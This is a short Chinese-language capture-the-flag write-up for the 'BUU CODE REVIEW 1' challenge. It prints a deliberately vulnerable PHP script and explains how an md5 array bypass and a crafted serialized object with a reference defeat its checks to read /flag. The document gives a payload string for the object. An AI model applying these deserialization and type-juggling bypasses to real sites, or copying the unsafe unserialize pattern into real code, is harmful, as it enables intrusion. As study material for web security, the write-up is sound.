# BUU CODE REVIEW 1

`考点：代码审计，反序列化`

- 进入页面，开始代码审计

```php
 <?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() { //魔术方法__destruct()，在项目销毁前调用自身
       try {
            //基于微秒计时，返回一个base64加密的当前时间戳，赋值给correct
           $this->correct = base64_encode(uniqid());
            //要求correct和input的值和数据类型均相同
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        //要求md51和md52的md5码相同，但值不同
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            //反序列化obj
            unserialize($_POST['obj']);
        }
    }
}

```

- 根据代码审计的结果，我们需要传入参数 `pleaseget=1` ， `pleasepost=2` ，使用数组传入 `md51[]=1` 和 `md52[]=2` 来绕过函数 `md5()` ，然后构建一个参数 `obj` ，使 `correct === input` ，这里可以使用引用传值，但考虑到obj会进行一次反序列化，所以需要先对 `obj` 进行序列化

```php
class BUU {
    public $correct = "";
    public $input = "";
}
$buu = new BUU();
$buu->input = &$buu->correct;
echo serialize($buu);
```

- 得到结果为 `O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}`，最终payload为下图

> <img src="../../IMG2/Screenshot 2024-05-12 191036.png">